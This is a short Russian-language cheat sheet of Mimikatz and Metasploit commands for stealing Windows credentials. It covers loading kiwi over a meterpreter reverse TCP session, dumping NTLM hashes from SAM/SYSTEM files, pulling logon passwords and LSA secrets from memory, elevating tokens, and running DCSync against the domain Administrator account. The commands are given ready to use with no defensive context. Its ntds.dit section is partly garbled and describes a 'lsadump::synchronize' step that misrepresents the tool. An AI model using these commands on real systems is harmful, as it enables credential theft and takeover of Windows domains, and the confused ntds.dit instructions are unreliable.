# mimi

МИМИКАТЗ в метасплойт

use windows/x64/meterpreter_reverse_tcp

load kiwi
kiwi_cmd lsadump::sam

https://github.com/gentilkiwi/mimikatz/releases 

Как извлечь хеш пароля пользователя NTLM из файлов реестра


Если есть готвый стянуты файл sam  и system

.\mimikatz.exe

lsadump::sam /system:C:\Share-Server\files\SYSTEM /sam:C:\Share-Server\files\SAM

Если из памяти...
После запуска Mimikatz можно использовать следующие команды для вытягивания паролей из памяти Windows:

- `privilege::debug` - открывает привилегии отладки для текущего процесса.
- `sekurlsa::logonPasswords` - выводит введенные пользователем логины и хэши паролей.
- `lsadump::sam` - вытягивает пароли из базы данных SAM.
- `lsadump::lsa` - вытягивает хэши паролей из дискового хранилища LSA.
- `token::elevate` - поднимает привилегии на максимальный уровень.
- `token::whoami` - выводит информацию о текущем пользователе.


Для получения данных из ntds.dit, аналогично команде lsadump::sam в инструменте Mimikatz, можно использовать следующие команды:

1. Загрузите ntds.dit в память с помощью команды "lsadump::synchronize". Например:
```
mimikatz # lsadump::synchronize /system:C:\Windows\system32\config\system /ntds:C:\Windows\NTDS\ntds.dit
```

2. Используйте команду "lsadump::dcsync" для извлечения данных из базы данных ntds.dit. Например:
```
mimikatz # lsadump::dcsync /user:Administrator
```
где "Administrator" - это имя пользователя, данные которого вы хотите получить.
